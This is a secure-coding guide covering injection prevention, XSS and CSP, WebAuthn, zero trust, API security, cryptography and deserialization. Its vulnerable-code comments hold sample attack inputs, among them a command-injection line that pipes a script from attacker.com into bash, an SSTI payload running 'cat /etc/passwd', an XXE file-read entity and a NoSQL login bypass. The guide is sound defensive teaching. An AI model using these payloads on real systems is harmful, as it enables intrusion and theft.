---
title: "Secure Coding Practices: Advanced AppSec and Security Programs"
phase: "03-development"
topic: "secure-coding-practices"
depth: "deep-water"
reading_time: 45
prerequisites: []
related_topics: ["secret-management", "code-review-process", "supply-chain-security", "threat-modeling"]
personas: ["specialist-expanding"]
updated: "2025-11-15"
---

# Secure Coding Practices: Advanced AppSec and Security Programs

You understand the OWASP Top 10. Your team validates input and uses parameterized queries. Now the question becomes: how do you build a mature application security program that scales across teams, detects sophisticated attacks, and maintains security as the codebase grows?

This is about security engineering, not just secure coding - building systems that resist advanced attacks, establishing security culture, and integrating AppSec into the entire SDLC.

## Introduction: Building Security into the SDLC

Security isn't a phase. It's not something you add after development or test before deployment. Security is a property of how software is built, from requirements through retirement.

A mature Secure SDLC (S-SDLC) embeds security at every stage:

- **Requirements**: Security requirements alongside functional requirements
- **Design**: Threat modeling identifies vulnerabilities before code exists
- **Development**: Secure coding standards, SAST in IDE
- **Testing**: Security testing (SAST, DAST, IAST), penetration testing
- **Deployment**: Hardened configurations, secrets management
- **Operations**: Monitoring, incident response, patch management
- **Retirement**: Secure data deletion, credential revocation

The goal: make it easier to do the secure thing than the insecure thing.

## Advanced Injection Prevention

Injection vulnerabilities remain pervasive despite decades of education. Defense in depth for injection means multiple layers of protection.

### SQL Injection: Defense in Depth

**Layer 1: Parameterized Queries**

The baseline. Every database query should use parameters, not concatenation.

```java
// ✅ Prepared statement (JDBC)
String sql = "SELECT * FROM users WHERE email = ? AND status = ?";
PreparedStatement stmt = connection.prepareStatement(sql);
stmt.setString(1, email);
stmt.setString(2, "active");
ResultSet rs = stmt.executeQuery();
```

**Layer 2: ORM with Parameterization**

ORMs help, but you can still shoot yourself in the foot with raw queries.

```python
# ✅ Django ORM - safe by default
users = User.objects.filter(email=email, status='active')

# ❌ Still vulnerable - string formatting
users = User.objects.raw(f"SELECT * FROM users WHERE email = '{email}'")

# ✅ ORM with raw SQL - use parameters
users = User.objects.raw(
    "SELECT * FROM users WHERE email = %s AND status = %s",
    [email, 'active']
)
```

**Layer 3: Stored Procedures with Parameters**

Stored procedures can provide an additional layer, but only if they also use parameters.

```sql
-- ✅ Parameterized stored procedure
CREATE PROCEDURE GetUserByEmail
    @Email NVARCHAR(255)
AS
BEGIN
    SELECT * FROM Users WHERE Email = @Email
END

-- Call from application
EXEC GetUserByEmail @Email = ?
```

**Layer 4: Input Validation**

Even with parameterized queries, validate input format.

```javascript
function validateEmail(email) {
    // RFC 5322 simplified
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!emailRegex.test(email)) {
        throw new Error('Invalid email format');
    }

    // Additional checks
    if (email.length > 254) {
        throw new Error('Email too long');
    }

    return email.toLowerCase().trim();
}
```

**Layer 5: Least Privilege Database Access**

Database user should have minimal permissions.

```sql
-- Application database user has limited permissions
CREATE USER app_readonly WITH PASSWORD 'secure_password';

-- Only SELECT on specific tables
GRANT SELECT ON users, orders, products TO app_readonly;

-- No DROP, ALTER, or admin privileges
-- Different credentials for migrations vs runtime
```

**Layer 6: WAF (Web Application Firewall)**

Final layer - detect and block SQL injection attempts at network edge.

```javascript
// AWS WAF rule to detect SQL injection
{
    "Name": "BlockSQLInjection",
    "Priority": 1,
    "Statement": {
        "OrStatement": {
            "Statements": [
                {
                    "ByteMatchStatement": {
                        "FieldToMatch": { "QueryString": {} },
                        "TextTransformations": [{ "Type": "URL_DECODE", "Priority": 0 }],
                        "PositionalConstraint": "CONTAINS",
                        "SearchString": "UNION SELECT"
                    }
                },
                {
                    "SqliMatchStatement": {
                        "FieldToMatch": { "Body": {} },
                        "TextTransformations": [{ "Type": "URL_DECODE", "Priority": 0 }]
                    }
                }
            ]
        }
    },
    "Action": { "Block": {} }
}
```

Each layer can fail. Together, they make exploitation extremely difficult.

### NoSQL Injection: Beyond MongoDB

NoSQL databases have different injection vectors.

**MongoDB Injection:**

```javascript
// ❌ Vulnerable to operator injection
app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    const user = await db.collection('users').findOne({
        username: username,
        password: password
    });

    // Attacker sends: { "username": "admin", "password": { "$ne": null } }
    // Query becomes: { username: "admin", password: { $ne: null } }
    // Matches if password field exists (bypasses authentication)
});

// ✅ Type validation prevents operator injection
app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    // Reject non-string values
    if (typeof username !== 'string' || typeof password !== 'string') {
        return res.status(400).json({ error: 'Invalid input types' });
    }

    // Hash password for comparison
    const hashedPassword = hashPassword(password);

    const user = await db.collection('users').findOne({
        username: username,
        passwordHash: hashedPassword
    });
});
```

**DynamoDB Injection:**

DynamoDB uses expression strings which can be vulnerable.

```python
# ❌ Vulnerable to injection
import boto3

def get_user_items(user_input):
    dynamodb = boto3.resource('dynamodb')
    table = dynamodb.Table('Items')

    # User input directly in FilterExpression
    response = table.scan(
        FilterExpression=f"userId = {user_input}"
    )
    return response['Items']

# ✅ Use expression attribute values
def get_user_items(user_id):
    dynamodb = boto3.resource('dynamodb')
    table = dynamodb.Table('Items')

    # Parameterized expression
    response = table.scan(
        FilterExpression='userId = :uid',
        ExpressionAttributeValues={
            ':uid': user_id
        }
    )
    return response['Items']
```

### LDAP Injection

LDAP injection allows attackers to modify LDAP queries, potentially bypassing authentication or accessing unauthorized data.

```java
// ❌ LDAP injection vulnerability
String filter = "(uid=" + username + ")";
NamingEnumeration results = context.search("ou=users,dc=example,dc=com", filter, controls);

// Attacker sends: username = "*)(uid=*))(|(uid=*"
// Query becomes: (uid=*)(uid=*))(|(uid=*)
// Returns all users

// ✅ Escape special characters
import javax.naming.ldap.LdapName;

public String escapeLDAPSearchFilter(String filter) {
    StringBuilder sb = new StringBuilder();
    for (char c : filter.toCharArray()) {
        switch (c) {
            case '\\':
                sb.append("\\5c");
                break;
            case '*':
                sb.append("\\2a");
                break;
            case '(':
                sb.append("\\28");
                break;
            case ')':
                sb.append("\\29");
                break;
            case '\0':
                sb.append("\\00");
                break;
            default:
                sb.append(c);
        }
    }
    return sb.toString();
}

String safeUsername = escapeLDAPSearchFilter(username);
String filter = "(uid=" + safeUsername + ")";
```

### XML Injection and XXE (XML External Entity)

XXE attacks exploit XML processors that evaluate external entity references, potentially reading arbitrary files or causing denial of service.

```java
// ❌ Vulnerable XML parsing
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));

// Attacker sends:
// <?xml version="1.0"?>
// <!DOCTYPE foo [
//   <!ENTITY xxe SYSTEM "file:///etc/passwd">
// ]>
// <user><name>&xxe;</name></user>
// Reads /etc/passwd file

// ✅ Secure XML parsing - disable external entities
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

// Disable DTDs entirely
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Disable external entities
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// Disable external DTDs
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

// Disable XInclude
factory.setXIncludeAware(false);

// Expand entity references
factory.setExpandEntityReferences(false);

DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
```

### Template Injection (SSTI - Server-Side Template Injection)

SSTI happens when user input is embedded into template engines without proper escaping.

```python
# ❌ SSTI vulnerability in Jinja2
from jinja2 import Template

user_input = request.args.get('name')
template = Template("Hello " + user_input)
output = template.render()

# Attacker sends: {{ config.items() }}
# Exposes Flask configuration including secret keys

# Or: {{ ''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate() }}
# Executes arbitrary code

# ✅ Use template safely - don't concatenate user input into template
from jinja2 import Environment, select_autoescape

env = Environment(autoescape=select_autoescape(['html', 'xml']))
template = env.from_string("Hello {{ name }}")
output = template.render(name=user_input)

# Even better: pre-defined templates only
template = env.get_template('greeting.html')
output = template.render(name=user_input)
```

### Command Injection: Beyond Basic Prevention

```python
# ❌ Command injection
import subprocess
filename = request.args.get('file')
subprocess.run(f'convert {filename} output.png', shell=True)

# Attacker sends: file=input.jpg; curl attacker.com/steal.sh | bash
# Executes arbitrary commands

# ✅ Level 1: Avoid shell, use list
filename = request.args.get('file')

# Validate filename
if not re.match(r'^[a-zA-Z0-9_.-]+$', filename):
    raise ValueError("Invalid filename")

subprocess.run(['convert', filename, 'output.png'], shell=False)

# ✅ Level 2: Sandboxing
import subprocess
import os

# Run in restricted environment
env = os.environ.copy()
env['PATH'] = '/usr/bin:/bin'  # Restricted PATH

result = subprocess.run(
    ['convert', filename, 'output.png'],
    shell=False,
    env=env,
    timeout=30,  # Prevent resource exhaustion
    cwd='/safe/working/directory',
    user='nobody'  # Run as unprivileged user (Linux)
)
```

## Advanced XSS Prevention

Cross-Site Scripting evolves. Mutation XSS (mXSS) bypasses traditional filters by exploiting browser parsing differences.

### Mutation XSS (mXSS)

mXSS occurs when sanitized HTML is re-parsed and mutates into executable code.

```javascript
// ❌ Vulnerable to mXSS
const userInput = '<noscript><p title="</noscript><img src=x onerror=alert(1)>">';

// After sanitization (removes script tags)
const sanitized = DOMPurify.sanitize(userInput);
// Result: <noscript><p title="</noscript><img src=x onerror=alert(1)>"</noscript>

// When inserted into <noscript> context and noscript disabled:
// Browser re-parses as: <p title=""></p><img src=x onerror=alert(1)>
// XSS executes

// ✅ Use Trusted Types API (modern browsers)
if (window.trustedTypes && trustedTypes.createPolicy) {
    const policy = trustedTypes.createPolicy('default', {
        createHTML: (string) => DOMPurify.sanitize(string, { RETURN_TRUSTED_TYPE: true })
    });

    element.innerHTML = policy.createHTML(userInput);
}
```

### Content Security Policy (CSP) Level 3

CSP prevents XSS by controlling what resources can execute.

```javascript
// Basic CSP
app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy',
        "default-src 'self'; " +
        "script-src 'self' 'unsafe-inline' 'unsafe-eval'; " +  // ❌ Still vulnerable
        "style-src 'self' 'unsafe-inline'"
    );
    next();
});

// ✅ Strict CSP with nonces
const crypto = require('crypto');

app.use((req, res, next) => {
    // Generate nonce for this request
    res.locals.nonce = crypto.randomBytes(16).toString('base64');

    res.setHeader('Content-Security-Policy',
        "default-src 'self'; " +
        `script-src 'self' 'nonce-${res.locals.nonce}'; ` +  // Only scripts with this nonce
        "style-src 'self' 'nonce-${res.locals.nonce}'; " +
        "object-src 'none'; " +
        "base-uri 'self'; " +
        "form-action 'self'; " +
        "frame-ancestors 'none'; " +
        "upgrade-insecure-requests"
    );
    next();
});

// In template
// <script nonce="<%= nonce %>">
//     console.log('Allowed');
// </script>
```

**CSP with hashes (for static scripts):**

```javascript
// Generate hash of script content
const scriptContent = "console.log('hello');";
const hash = crypto.createHash('sha256').update(scriptContent).digest('base64');

// CSP header
res.setHeader('Content-Security-Policy',
    `script-src 'self' 'sha256-${hash}'`
);

// HTML
// <script>console.log('hello');</script>
// Executes because hash matches
```

### Trusted Types API

Modern browsers support Trusted Types to prevent DOM XSS.

```javascript
// ✅ Enforce Trusted Types
res.setHeader('Content-Security-Policy',
    "require-trusted-types-for 'script'; " +
    "trusted-types default"
);

// Create policy
const policy = trustedTypes.createPolicy('default', {
    createHTML: (input) => {
        // Sanitize HTML
        return DOMPurify.sanitize(input, { RETURN_TRUSTED_TYPE: true });
    },
    createScriptURL: (input) => {
        // Validate script URLs
        const url = new URL(input, document.baseURI);
        if (url.origin === location.origin) {
            return input;
        }
        throw new TypeError('Invalid script URL');
    },
    createScript: (input) => {
        // Generally disallow, or sanitize
        throw new TypeError('Inline scripts not allowed');
    }
});

// Now DOM sinks require Trusted Types
element.innerHTML = policy.createHTML(userInput);  // ✅ Safe
element.innerHTML = userInput;  // ❌ Throws error
```

### Subresource Integrity (SRI)

Verify that resources loaded from CDNs haven't been tampered with.

```html
<!-- ✅ SRI for CDN resources -->
<script
    src="https://cdn.example.com/library.js"
    integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
    crossorigin="anonymous">
</script>

<!-- If file content changes, hash won't match and browser refuses to execute -->
```

Generate SRI hashes:

```bash
# Generate SRI hash
curl https://cdn.example.com/library.js | openssl dgst -sha384 -binary | openssl base64 -A

# Or use online generator: https://www.srihash.org/
```

## Advanced Authentication Patterns

### Passwordless Authentication with WebAuthn

WebAuthn uses public-key cryptography for phishing-resistant authentication.

```javascript
// Server-side (Node.js with @simplewebauthn/server)
const { generateRegistrationOptions, verifyRegistrationResponse } = require('@simplewebauthn/server');

// Registration: Generate challenge
app.get('/auth/register/options', async (req, res) => {
    const user = req.user;

    const options = generateRegistrationOptions({
        rpName: 'Your App',
        rpID: 'example.com',
        userID: user.id,
        userName: user.email,
        attestationType: 'none',
        authenticatorSelection: {
            residentKey: 'required',
            userVerification: 'required',
        },
    });

    // Store challenge for verification
    req.session.challenge = options.challenge;

    res.json(options);
});

// Registration: Verify response
app.post('/auth/register/verify', async (req, res) => {
    const { credential } = req.body;

    const verification = await verifyRegistrationResponse({
        credential,
        expectedChallenge: req.session.challenge,
        expectedOrigin: 'https://example.com',
        expectedRPID: 'example.com',
    });

    if (verification.verified) {
        // Store credential
        await storeCredential({
            userId: req.user.id,
            credentialID: verification.registrationInfo.credentialID,
            publicKey: verification.registrationInfo.credentialPublicKey,
            counter: verification.registrationInfo.counter,
        });

        res.json({ verified: true });
    }
});

// Authentication: Similar process
app.get('/auth/authenticate/options', async (req, res) => {
    const options = generateAuthenticationOptions({
        rpID: 'example.com',
        userVerification: 'required',
    });

    req.session.challenge = options.challenge;
    res.json(options);
});
```

**Client-side:**

```javascript
// Registration
async function registerCredential() {
    // Get options from server
    const optionsResponse = await fetch('/auth/register/options');
    const options = await optionsResponse.json();

    // Create credential
    const credential = await navigator.credentials.create({
        publicKey: options
    });

    // Send to server for verification
    await fetch('/auth/register/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ credential })
    });
}

// Authentication
async function authenticate() {
    const optionsResponse = await fetch('/auth/authenticate/options');
    const options = await optionsResponse.json();

    const credential = await navigator.credentials.get({
        publicKey: options
    });

    const response = await fetch('/auth/authenticate/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ credential })
    });

    const result = await response.json();
    if (result.verified) {
        // Authenticated
    }
}
```

### Zero Trust Architecture

Zero Trust means "never trust, always verify" - even inside the network perimeter.

**Principles:**
- Verify explicitly (authenticate and authorize every request)
- Least privilege access (minimal permissions needed)
- Assume breach (segment networks, monitor everything)

**Implementation with service mesh (Istio):**

```yaml
# Mutual TLS between services
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: production
spec:
  mtls:
    mode: STRICT  # Require mTLS for all traffic

---
# Authorization policy - deny by default
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: deny-all
  namespace: production
spec:
  {}  # Empty spec denies all

---
# Allow specific service-to-service communication
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: allow-api-to-db
  namespace: production
spec:
  selector:
    matchLabels:
      app: database
  action: ALLOW
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/production/sa/api-service"]
    to:
    - operation:
        methods: ["GET", "POST"]
        ports: ["5432"]
```

**Application-level Zero Trust:**

```python
# Every request verifies identity and authorization
from functools import wraps
import jwt

def verify_service_token(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('X-Service-Token')

        if not token:
            return jsonify({'error': 'Missing service token'}), 401

        try:
            # Verify JWT from calling service
            payload = jwt.decode(
                token,
                public_key,
                algorithms=['RS256'],
                audience='database-service'
            )

            # Verify service identity
            if payload['service'] not in ALLOWED_SERVICES:
                return jsonify({'error': 'Unauthorized service'}), 403

            # Check specific permission
            if not has_permission(payload['service'], request.path, request.method):
                return jsonify({'error': 'Insufficient permissions'}), 403

            request.service_identity = payload
            return f(*args, **kwargs)

        except jwt.InvalidTokenError:
            return jsonify({'error': 'Invalid token'}), 401

    return decorated

@app.route('/api/users/<user_id>')
@verify_service_token
def get_user(user_id):
    # Service identity verified
    # Authorization checked
    # Audit logged
    audit_log(
        service=request.service_identity['service'],
        action='get_user',
        resource=user_id
    )

    user = User.query.get(user_id)
    return jsonify(user.to_dict())
```

### Step-Up Authentication

Require additional authentication for sensitive operations.

```javascript
// Middleware to check authentication age
function requireRecentAuth(maxAgeMinutes = 15) {
    return (req, res, next) => {
        const authTime = req.session.authTimestamp;
        const now = Date.now();

        if (!authTime || (now - authTime) > (maxAgeMinutes * 60 * 1000)) {
            // Authentication too old or doesn't exist
            return res.status(403).json({
                error: 'Re-authentication required',
                redirectTo: '/re-authenticate'
            });
        }

        next();
    };
}

// Sensitive operation requires recent authentication
app.post('/api/payment/execute',
    authenticate,
    requireRecentAuth(5),  // Must have authenticated within 5 minutes
    async (req, res) => {
        // Process payment
    }
);

// Re-authentication endpoint
app.post('/re-authenticate', authenticate, async (req, res) => {
    const { password } = req.body;

    if (!await verifyPassword(req.user, password)) {
        return res.status(401).json({ error: 'Invalid password' });
    }

    // Update authentication timestamp
    req.session.authTimestamp = Date.now();
    res.json({ success: true });
});
```

### Adaptive Authentication (Risk-Based)

Adjust authentication requirements based on risk signals.

```python
def calculate_risk_score(request):
    """Calculate risk score for authentication attempt"""
    score = 0

    # Check IP reputation
    if is_known_bad_ip(request.remote_addr):
        score += 50

    # Check geolocation
    user_location = get_user_typical_location(request.user)
    request_location = geolocate_ip(request.remote_addr)

    if distance(user_location, request_location) > 1000:  # km
        score += 30

    # Check device fingerprint
    if not is_known_device(request.user, get_device_fingerprint(request)):
        score += 20

    # Check time of access
    if is_unusual_time(request.user, datetime.now()):
        score += 10

    # Check velocity (rapid requests from different locations)
    if detect_impossible_travel(request.user):
        score += 40

    return score

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    user = User.query.filter_by(username=username).first()

    if not user or not verify_password(user, password):
        return jsonify({'error': 'Invalid credentials'}), 401

    # Calculate risk
    risk_score = calculate_risk_score(request)

    if risk_score < 20:
        # Low risk - allow login
        session = create_session(user)
        return jsonify({'token': session.token})

    elif risk_score < 50:
        # Medium risk - require MFA
        mfa_token = request.form.get('mfa_token')

        if not mfa_token:
            return jsonify({
                'error': 'MFA required',
                'challenge': 'totp'
            }), 403

        if not verify_mfa(user, mfa_token):
            return jsonify({'error': 'Invalid MFA token'}), 401

        session = create_session(user)
        return jsonify({'token': session.token})

    else:
        # High risk - block and alert
        security_alert(
            type='high_risk_login',
            user=user.id,
            risk_score=risk_score,
            ip=request.remote_addr,
            location=geolocate_ip(request.remote_addr)
        )

        return jsonify({
            'error': 'Login blocked due to suspicious activity. Check your email.'
        }), 403
```

## API Security

### API Rate Limiting and Throttling

Prevent abuse and DoS attacks with sophisticated rate limiting.

```python
from redis import Redis
import time

redis_client = Redis(host='localhost', port=6379, db=0)

class RateLimiter:
    """Token bucket rate limiter"""

    def __init__(self, rate, capacity):
        self.rate = rate  # Tokens per second
        self.capacity = capacity  # Max tokens

    def is_allowed(self, key):
        """Check if request is allowed"""
        now = time.time()

        # Get current tokens and last update time
        tokens_key = f'tokens:{key}'
        timestamp_key = f'timestamp:{key}'

        tokens = float(redis_client.get(tokens_key) or self.capacity)
        last_update = float(redis_client.get(timestamp_key) or now)

        # Refill tokens based on time elapsed
        elapsed = now - last_update
        tokens = min(self.capacity, tokens + elapsed * self.rate)

        if tokens >= 1:
            # Allow request, consume token
            tokens -= 1
            redis_client.setex(tokens_key, 3600, tokens)
            redis_client.setex(timestamp_key, 3600, now)
            return True
        else:
            # Rate limited
            return False

# Different limits for different tiers
rate_limiters = {
    'free': RateLimiter(rate=1, capacity=10),      # 1 req/sec, burst of 10
    'pro': RateLimiter(rate=10, capacity=100),     # 10 req/sec, burst of 100
    'enterprise': RateLimiter(rate=100, capacity=1000)
}

def rate_limit(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        user = request.user
        tier = user.subscription_tier if user else 'free'

        limiter = rate_limiters.get(tier)
        key = f"{tier}:{user.id if user else request.remote_addr}"

        if not limiter.is_allowed(key):
            return jsonify({
                'error': 'Rate limit exceeded',
                'retry_after': 1  # seconds
            }), 429

        return f(*args, **kwargs)

    return decorated

@app.route('/api/search')
@rate_limit
def search():
    # Rate limited endpoint
    pass
```

**Distributed rate limiting (for multiple servers):**

```javascript
// Using Redis with sliding window
const Redis = require('ioredis');
const redis = new Redis();

async function slidingWindowRateLimit(key, limit, windowSeconds) {
    const now = Date.now();
    const windowStart = now - (windowSeconds * 1000);

    // Remove old entries
    await redis.zremrangebyscore(key, 0, windowStart);

    // Count requests in window
    const count = await redis.zcard(key);

    if (count < limit) {
        // Add current request
        await redis.zadd(key, now, `${now}-${Math.random()}`);
        await redis.expire(key, windowSeconds);
        return { allowed: true, remaining: limit - count - 1 };
    } else {
        return { allowed: false, remaining: 0 };
    }
}

// Middleware
async function rateLimitMiddleware(req, res, next) {
    const key = `ratelimit:${req.user?.id || req.ip}`;
    const result = await slidingWindowRateLimit(key, 100, 60);  // 100 req/min

    if (!result.allowed) {
        return res.status(429).json({ error: 'Too many requests' });
    }

    res.setHeader('X-RateLimit-Remaining', result.remaining);
    next();
}
```

### OAuth 2.0 Security Considerations

OAuth 2.0 is complex. Implementation mistakes create vulnerabilities.

**PKCE (Proof Key for Code Exchange):**

Essential for public clients (mobile apps, SPAs).

```javascript
// Client-side
const crypto = require('crypto');

// Generate code verifier (random string)
const codeVerifier = crypto.randomBytes(32).toString('base64url');

// Generate code challenge (hash of verifier)
const codeChallenge = crypto
    .createHash('sha256')
    .update(codeVerifier)
    .digest('base64url');

// Authorization request
const authUrl = new URL('https://auth.example.com/authorize');
authUrl.searchParams.set('response_type', 'code');
authUrl.searchParams.set('client_id', 'your-client-id');
authUrl.searchParams.set('redirect_uri', 'https://app.example.com/callback');
authUrl.searchParams.set('code_challenge', codeChallenge);
authUrl.searchParams.set('code_challenge_method', 'S256');
authUrl.searchParams.set('state', generateRandomState());

// Redirect user to authUrl

// After authorization, exchange code for token
const tokenResponse = await fetch('https://auth.example.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
        grant_type: 'authorization_code',
        code: authorizationCode,
        redirect_uri: 'https://app.example.com/callback',
        client_id: 'your-client-id',
        code_verifier: codeVerifier  // Send original verifier
    })
});

// Server verifies: hash(code_verifier) === stored code_challenge
```

**State parameter (CSRF protection):**

```python
# Authorization request
import secrets

state = secrets.token_urlsafe(32)
session['oauth_state'] = state

authorization_url = (
    f"https://auth.example.com/authorize?"
    f"response_type=code&"
    f"client_id={CLIENT_ID}&"
    f"redirect_uri={REDIRECT_URI}&"
    f"state={state}"
)

# Callback handler
@app.route('/oauth/callback')
def oauth_callback():
    returned_state = request.args.get('state')
    expected_state = session.get('oauth_state')

    if not returned_state or returned_state != expected_state:
        # CSRF attack detected
        abort(403, "Invalid state parameter")

    # Clear used state
    session.pop('oauth_state', None)

    # Proceed with token exchange
```

### GraphQL Security

GraphQL introduces unique security challenges.

**Query depth limiting:**

```javascript
const depthLimit = require('graphql-depth-limit');
const { ApolloServer } = require('apollo-server');

const server = new ApolloServer({
    typeDefs,
    resolvers,
    validationRules: [
        depthLimit(5)  // Max query depth of 5
    ]
});

// Prevents deeply nested queries:
// query {
//   user {
//     posts {
//       author {
//         posts {
//           author {
//             posts {
//               ...  // Too deep
```

**Query complexity analysis:**

```javascript
const { createComplexityLimitRule } = require('graphql-validation-complexity');

const server = new ApolloServer({
    typeDefs,
    resolvers,
    validationRules: [
        createComplexityLimitRule(1000, {
            scalarCost: 1,
            objectCost: 2,
            listFactor: 10
        })
    ]
});

// Calculates total query cost
// Blocks expensive queries before execution
```

**Field-level authorization:**

```javascript
const { shield, rule } = require('graphql-shield');

// Define rules
const isAuthenticated = rule()(async (parent, args, ctx) => {
    return ctx.user !== null;
});

const isOwner = rule()(async (parent, args, ctx) => {
    return parent.userId === ctx.user.id;
});

const isAdmin = rule()(async (parent, args, ctx) => {
    return ctx.user?.role === 'admin';
});

// Apply to schema
const permissions = shield({
    Query: {
        user: isAuthenticated,
        users: isAdmin,
    },
    Mutation: {
        createPost: isAuthenticated,
        deletePost: or(isOwner, isAdmin),
    },
    User: {
        email: or(isOwner, isAdmin),  // Email only visible to owner or admin
    }
});

const server = new ApolloServer({
    typeDefs,
    resolvers,
    schema: applyMiddleware(schema, permissions)
});
```

## Cryptography Deep Dive

### Symmetric Encryption: AES-GCM

AES-GCM provides authenticated encryption (confidentiality + integrity).

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

def encrypt_data(plaintext, key):
    """Encrypt data with AES-256-GCM"""
    aesgcm = AESGCM(key)  # 32-byte key for AES-256

    # Generate random nonce (12 bytes for GCM)
    nonce = os.urandom(12)

    # Encrypt and authenticate
    ciphertext = aesgcm.encrypt(nonce, plaintext.encode(), None)

    # Return nonce + ciphertext (both needed for decryption)
    return nonce + ciphertext

def decrypt_data(encrypted_data, key):
    """Decrypt AES-256-GCM data"""
    aesgcm = AESGCM(key)

    # Split nonce and ciphertext
    nonce = encrypted_data[:12]
    ciphertext = encrypted_data[12:]

    # Decrypt and verify
    plaintext = aesgcm.decrypt(nonce, ciphertext, None)

    return plaintext.decode()

# Usage
key = AESGCM.generate_key(bit_length=256)
encrypted = encrypt_data("sensitive data", key)
decrypted = decrypt_data(encrypted, key)
```

### Key Derivation Functions

Never use passwords directly as encryption keys. Derive keys using KDFs.

```python
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import os

def derive_key(password, salt=None):
    """Derive encryption key from password"""
    if salt is None:
        salt = os.urandom(16)

    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,  # 256-bit key
        salt=salt,
        iterations=600000,  # OWASP recommendation
    )

    key = kdf.derive(password.encode())
    return key, salt

# Better: Use Argon2 (winner of Password Hashing Competition)
import argon2

def hash_password(password):
    """Hash password with Argon2id"""
    ph = argon2.PasswordHasher(
        time_cost=3,       # Iterations
        memory_cost=65536, # 64 MB
        parallelism=4,     # Threads
        hash_len=32,
        salt_len=16
    )

    return ph.hash(password)

def verify_password(hash, password):
    ph = argon2.PasswordHasher()

    try:
        ph.verify(hash, password)
        return True
    except argon2.exceptions.VerifyMismatchError:
        return False
```

### Envelope Encryption

For large data or multiple items, use envelope encryption: encrypt data with a data key, encrypt the data key with a master key.

```python
import boto3
import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# AWS KMS client
kms = boto3.client('kms')

def encrypt_with_envelope(plaintext, master_key_id):
    """Encrypt using envelope encryption with AWS KMS"""

    # Generate data key
    response = kms.generate_data_key(
        KeyId=master_key_id,
        KeySpec='AES_256'
    )

    plaintext_key = response['Plaintext']
    encrypted_key = response['CiphertextBlob']

    # Encrypt data with data key
    aesgcm = AESGCM(plaintext_key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext.encode(), None)

    # Return encrypted data key + nonce + ciphertext
    return {
        'encrypted_key': encrypted_key,
        'nonce': nonce,
        'ciphertext': ciphertext
    }

def decrypt_with_envelope(encrypted_data, master_key_id):
    """Decrypt envelope encrypted data"""

    # Decrypt data key using KMS
    response = kms.decrypt(
        CiphertextBlob=encrypted_data['encrypted_key']
    )

    plaintext_key = response['Plaintext']

    # Decrypt data using data key
    aesgcm = AESGCM(plaintext_key)
    plaintext = aesgcm.decrypt(
        encrypted_data['nonce'],
        encrypted_data['ciphertext'],
        None
    )

    return plaintext.decode()

# Benefits:
# - Master key never leaves KMS
# - Can encrypt large amounts of data efficiently
# - Can rotate master key without re-encrypting all data
```

### Post-Quantum Cryptography Considerations

Quantum computers will break current asymmetric cryptography (RSA, ECC). NIST is standardizing post-quantum algorithms.

**Current recommendation:** Use hybrid approach (classical + post-quantum) for forward security.

```python
# Example: Hybrid key exchange (not production code)
# Combines X25519 (classical) with Kyber (post-quantum)

from cryptography.hazmat.primitives.asymmetric import x25519
# from pqcrypto.kem.kyber import generate_keypair, encrypt, decrypt

def hybrid_key_exchange():
    """Combine classical and PQ key exchange"""

    # Classical: X25519
    classical_private = x25519.X25519PrivateKey.generate()
    classical_public = classical_private.public_key()

    # Post-quantum: Kyber (when available)
    # pq_public, pq_private = generate_keypair()

    # In production, combine both secrets
    # classical_shared = classical_private.exchange(peer_public)
    # pq_shared = decrypt(pq_private, pq_ciphertext)
    # final_key = KDF(classical_shared || pq_shared)

    pass
```

**Practical steps for PQ readiness:**
1. Use TLS 1.3 (supports PQ hybrid key exchange)
2. Plan for longer key sizes (PQ keys are larger)
3. Monitor NIST standardization (FIPS 203, 204, 205)
4. Test hybrid implementations
5. Prepare for crypto-agility (ability to swap algorithms)

## Deserialization Security

Insecure deserialization can lead to remote code execution.

### Java Deserialization

Java deserialization has been a major attack vector.

```java
// ❌ Dangerous - deserializes untrusted data
ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
Object obj = ois.readObject();  // RCE possible

// Attacker sends malicious serialized object
// Exploit chain: Apache Commons Collections, Spring, ...
```

**Mitigations:**

```java
// ✅ Option 1: Don't deserialize untrusted data
// Use JSON instead

// ✅ Option 2: Use look-ahead deserialization filter (Java 9+)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.example.SafeClass;com.example.AnotherSafeClass;!*"
);

ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(filter);
Object obj = ois.readObject();

// ✅ Option 3: Use safer serialization (Protocol Buffers, MessagePack)
```

